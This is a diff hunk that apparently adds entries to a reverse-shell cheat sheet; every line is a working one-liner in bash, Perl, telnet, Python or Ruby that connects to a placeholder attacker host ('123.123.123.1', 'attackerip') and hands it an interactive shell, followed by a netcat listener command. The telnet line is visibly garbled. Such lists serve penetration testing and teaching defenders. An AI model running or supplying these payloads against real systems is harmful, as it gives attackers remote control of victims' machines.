@@ -10,5 +10,9 @@ bash -c "bash -i >& /dev/tcp/123.123.123.1/1234 0>&1"
 perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>; 
+rm -f /tmp/p; mknod /tmp/p p && telnet 123.123.123.1 1234 0/tmp/p
+#Thanks to UB3RSEC
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.123.123.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 On listening host: nc -lvnp 1234
